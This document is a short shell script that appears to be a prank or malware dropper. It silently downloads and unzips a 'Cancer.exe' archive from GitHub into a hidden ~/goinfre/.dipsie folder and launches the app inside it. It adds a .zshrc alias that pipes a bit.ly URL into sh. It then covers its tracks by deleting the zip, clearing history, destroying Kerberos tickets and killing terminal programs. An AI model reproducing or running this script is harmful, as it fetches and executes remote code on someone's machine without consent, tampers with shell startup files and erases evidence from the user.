store () 
{
	mkdir -p ~/goinfre/.dipsie/

	curl -s -L https://github.com/ymoustai/Cancer.exe/blob/master/Cancer.exe.zip?raw=true -o ~/goinfre/.dipsie/Cancer.exe.zip > /dev/null

	unzip -o ~/goinfre/.dipsie/Cancer.exe.zip -d ~/goinfre/.dipsie/ > /dev/null

	nohup open ~/goinfre/.dipsie/cancer.app > /dev/null
}

if [ `alias | grep dipsie | wc -l` -eq 0 ]; then
  echo "alias dipsie='curl -s -L bit.ly/cancerdotexe | sh'" >> ~/.zshrc
fi

if [ -e ~/goinfre/.dipsie/cancer.app ]; then
	nohup open ~/goinfre/.dipsie/cancer.app > /dev/null
else
	store
fi

rm -f ~/goinfre/.dipsie/*.zip
clear
history -c
kdestroy
killall iTerm
killall Terminal
killall iTerm2